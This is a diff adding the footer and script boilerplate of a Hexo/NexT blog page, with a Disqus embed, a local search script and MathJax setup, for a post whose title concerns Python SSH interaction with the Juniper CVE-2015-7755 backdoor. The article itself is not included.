+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2015 - 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">dog2</span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+
+
+  
+
+    <script type="text/javascript">
+      var disqus_shortname = 'd0g2';
+      var disqus_identifier = 'tech/shell-interaction-in-python-2-ssh/';
+      var disqus_title = "Python实现终端交互 —— 以Juniper后门CVE-2015-7755为例（二）: SSH篇";
+      var disqus_url = 'http://dog.wtf/tech/shell-interaction-in-python-2-ssh/';
+
+      function run_disqus_script(disqus_script){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      }
+
+      run_disqus_script('count.js');
+      
+        run_disqus_script('embed.js');
+      
+    </script>
+  
+
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+       search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+    'use strict';
+    $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+            // get the contents from search data
+            isfetched = true;
+            $('.popup').detach().appendTo('.header-inner');
+            var datas = $( "entry", xmlResponse ).map(function() {
+                return {
+                    title: $( "title", this ).text(),
+                    content: $("content",this).text(),
+                    url: $( "url" , this).text()
+                };
+            }).get();
+            var $input = document.getElementById(search_id);
+            var $resultContent = document.getElementById(content_id);
+            $input.addEventListener('input', function(){
+                var matchcounts = 0;
+                var str='<ul class=\"search-result-list\">';                
+                var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                $resultContent.innerHTML = "";
+                if (this.value.trim().length > 1) {
+                // perform local searching
+                datas.forEach(function(data) {
+                    var isMatch = true;
+                    var content_index = [];
+                    var data_title = data.title.trim().toLowerCase();
+                    var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                    var data_url = data.url;
+                    var index_title = -1;
+                    var index_content = -1;
+                    var first_occur = -1;
+                    // only match artiles with not empty titles and contents
+                    if(data_title != '' && data_content != '') {
+                        keywords.forEach(function(keyword, i) {
+                            index_title = data_title.indexOf(keyword);
+                            index_content = data_content.indexOf(keyword);
+                            if( index_title < 0 && index_content < 0 ){
+                                isMatch = false;
+                            } else {
+                                if (index_content < 0) {
+                                    index_content = 0;
+                                }
+                                if (i == 0) {
+                                    first_occur = index_content;
+                                }
+                            }
+                        });
+                    }
+                    // show search results
+                    if (isMatch) {
+                        matchcounts += 1;
+                        str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                        var content = data.content.trim().replace(/<[^>]+>/g,"");
+                        if (first_occur >= 0) {
+                            // cut out 100 characters
+                            var start = first_occur - 20;
+                            var end = first_occur + 80;
+                            if(start < 0){
+                                start = 0;
+                            }
+                            if(start == 0){
+                                end = 50;
+                            }
+                            if(end > content.length){
+                                end = content.length;
+                            }
+                            var match_content = content.substring(start, end);
+                            // highlight all keywords
+                            keywords.forEach(function(keyword){
+                                var regS = new RegExp(keyword, "gi");
+                                match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                            });
+                            
+                            str += "<p class=\"search-result\">" + match_content +"...</p>"
+                        }
+                        str += "</li>";
+                    }
+                })};
+                str += "</ul>";
+                if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+                if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+                $resultContent.innerHTML = str;
+            });
+            proceedsearch();
+        }
+    });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').mousedown(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+  
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+  </script>
+
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for (i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  </script>
+  <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+  
+
+  
+
+</body>
+</html>
